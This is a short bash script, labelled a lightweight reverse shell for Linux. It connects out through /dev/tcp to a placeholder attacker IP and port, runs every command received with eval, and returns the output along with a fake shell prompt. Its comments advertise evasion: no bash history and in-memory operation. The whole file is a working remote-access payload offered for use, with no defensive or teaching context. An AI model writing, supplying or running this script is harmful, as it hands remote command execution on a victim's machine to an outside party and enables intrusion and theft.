#!/bin/bash
# Lightweight reverse shell (Linux, 2025-safe)
# No bash history leak, works in memory, clean disconnect

HOST="REPLACE_IP"
PORT=REPLACE_PORT

exec 5<>/dev/tcp/$HOST/$PORT
while read -r cmd <&5; do
  if [[ "$cmd" == "exit" ]]; then
    break
  fi
  output=$(eval "$cmd" 2>&1)
  echo "$output" >&5
  echo -n "\n$USER@$(hostname):~$ " >&5
done
exec 5>&-
